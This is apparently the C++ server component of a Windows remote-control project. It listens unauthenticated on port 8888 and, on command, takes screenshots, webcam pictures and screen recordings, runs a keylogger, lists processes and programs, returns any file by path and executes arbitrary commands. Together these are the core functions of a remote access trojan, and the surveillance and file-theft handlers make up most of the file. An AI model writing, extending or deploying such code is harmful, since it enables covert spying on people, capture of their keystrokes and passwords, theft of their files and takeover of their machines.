#include "../Application/lib.h"
#include "../Application/executeCommand.h"

const string saveDir = "C:/Users/Tien/Documents/Client-Server/";
const int BUFFER_SIZE = 8192;  // Tăng buffer size

std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
    {"get_screenshot",
     [](std::string &outFile) {
       outFile = saveDir + "screenshot.png";
       take_screenshot(outFile);
     }},
    {"get_picture",
     [](std::string &outFile) {
       outFile = saveDir + "picture.png";
       take_picture(outFile);
     }},
    {"list_program",
     [](std::string &outFile) {
       outFile = saveDir + "programs.txt";
       list_programs_to_file(outFile);
     }},
    {"list_process",
     [](std::string &outFile) {
       outFile = saveDir + "processes.txt";
       list_processes_to_file(outFile);
     }},
    {"get_recording",
     [](std::string &outFile) {
       outFile = saveDir + "recording.avi";
       run_recording_and_save(outFile, 10);
     }},
    {"keylogger", [](std::string &outFile) {
       outFile = saveDir + "keylog.txt";
       run_keylogger_and_save(outFile, 10);
     }}};

// Cải thiện hàm send file với error handling và progress
bool send_file_over_socket(SOCKET sock, const std::string &filename) {
  std::ifstream file(filename, std::ios::binary);
  if (!file) {
    std::cout << "[ERROR] Cannot open file: " << filename << std::endl;
    size_t fileSize = 0;
    send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize), 0);
    return false;
  }

  file.seekg(0, std::ios::end);
  size_t fileSize = file.tellg();
  file.seekg(0, std::ios::beg);

  std::cout << "[INFO] Sending file: " << filename << " (" << fileSize
            << " bytes)" << std::endl;

  // Gửi file size trước
  if (send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize),
           0) == SOCKET_ERROR) {
    std::cout << "[ERROR] Failed to send file size" << std::endl;
    return false;
  }

  // Gửi data với buffer lớn hơn
  std::vector<char> buffer(BUFFER_SIZE);
  size_t totalSent = 0;

  while (file && totalSent < fileSize) {
    file.read(buffer.data(), BUFFER_SIZE);
    std::streamsize bytesRead = file.gcount();

    if (bytesRead > 0) {
      int result = send(sock, buffer.data(), static_cast<int>(bytesRead), 0);
      if (result == SOCKET_ERROR) {
        std::cout << "[ERROR] Send failed at byte: " << totalSent << std::endl;
        return false;
      }
      totalSent += result;

      // Progress cho file lớn
      if (fileSize > 1024 * 1024 && totalSent % (1024 * 1024) == 0) {
        std::cout << "[PROGRESS] Sent: " << (totalSent / (1024 * 1024)) << " MB"
                  << std::endl;
      }
    }
  }

  std::cout << "[SUCCESS] File sent: " << totalSent << " bytes" << std::endl;
  return true;
}

// Cải thiện receive message
std::string receive_command(SOCKET sock) {
  char buffer[4096] = {};
  int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);

  if (bytes <= 0) {
    return "";
  }

  buffer[bytes] = '\0';
  return std::string(buffer);
}

static std::string trim(const std::string &s) {
  size_t a = s.find_first_not_of(" \r\n\t");
  if (a == std::string::npos) return "";
  size_t b = s.find_last_not_of(" \r\n\t");
  return s.substr(a, b - a + 1);
}

// Xử lý client với error handling tốt hơn
void handle_client(SOCKET clientSocket) {
  std::cout << "[Connection] Client connected" << std::endl;

  try {
    std::string message = receive_command(clientSocket);
    if (message.empty()) {
      std::cout << "[Warning] Empty message received" << std::endl;
      closesocket(clientSocket);
      return;
    }

    std::istringstream iss(message);
    std::string sender_email, command;
    std::getline(iss, sender_email);
    std::getline(iss, command);

    sender_email = trim(sender_email);
    command = trim(command);

    std::cout << "[Server] Command from " << sender_email << ": " << command
              << std::endl;

    // Xử lý send_file với path cụ thể
    if (command.find("send_file") == 0) {
      std::string filepath = command.substr(9);
      filepath = trim(filepath);

      if (!filepath.empty()) {
        send_file_over_socket(clientSocket, filepath);
      } else {
        std::cout << "[Error] No file path provided" << std::endl;
        size_t fileSize = 0;
        send(clientSocket, reinterpret_cast<const char *>(&fileSize),
             sizeof(fileSize), 0);
      }
    }
    // Xử lý các command có sẵn
    else if (commandHandlers.count(command)) {
      std::string outputFile;
      commandHandlers[command](outputFile);

      if (!send_file_over_socket(clientSocket, outputFile)) {
        std::cout << "[Error] Failed to send result file" << std::endl;
      }
    }
    // Execute command thông thường
    else {
      execute_command_with_sender(sender_email, command);

      // Gửi confirmation message
      std::string confirmMsg = "Command executed: " + command;
      size_t msgSize = confirmMsg.length();
      send(clientSocket, reinterpret_cast<const char *>(&msgSize),
           sizeof(msgSize), 0);
      send(clientSocket, confirmMsg.c_str(), static_cast<int>(msgSize), 0);
    }

  } catch (const std::exception &e) {
    std::cout << "[Error] Exception: " << e.what() << std::endl;
  }

  closesocket(clientSocket);
  std::cout << "[Disconnect] Client disconnected" << std::endl;
}

int main() {
  std::cout << "[Startup] Starting server..." << std::endl;

  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    std::cout << "[Error] WSAStartup failed" << std::endl;
    return 1;
  }

  SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  if (serverSocket == INVALID_SOCKET) {
    std::cout << "[Error] Socket creation failed" << std::endl;
    WSACleanup();
    return 1;
  }

  // Set socket option để reuse address
  int optval = 1;
  setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR,
             reinterpret_cast<const char *>(&optval), sizeof(optval));

  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(8888);
  serverAddr.sin_addr.s_addr = INADDR_ANY;

  if (bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    std::cout << "[Error] Bind failed" << std::endl;
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  if (listen(serverSocket, 5) == SOCKET_ERROR) {
    std::cout << "[Error] Listen failed" << std::endl;
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  std::cout << "[Server] Listening on port 8888..." << std::endl;

  while (true) {
    sockaddr_in clientAddr{};
    int clientSize = sizeof(clientAddr);
    SOCKET clientSocket =
        accept(serverSocket, (sockaddr *)&clientAddr, &clientSize);

    if (clientSocket == INVALID_SOCKET) {
      std::cout << "[Warning] Accept failed" << std::endl;
      continue;
    }

    // Xử lý client - có thể thêm thread ở đây nếu cần
    handle_client(clientSocket);
  }

  closesocket(serverSocket);
  WSACleanup();
  return 0;
}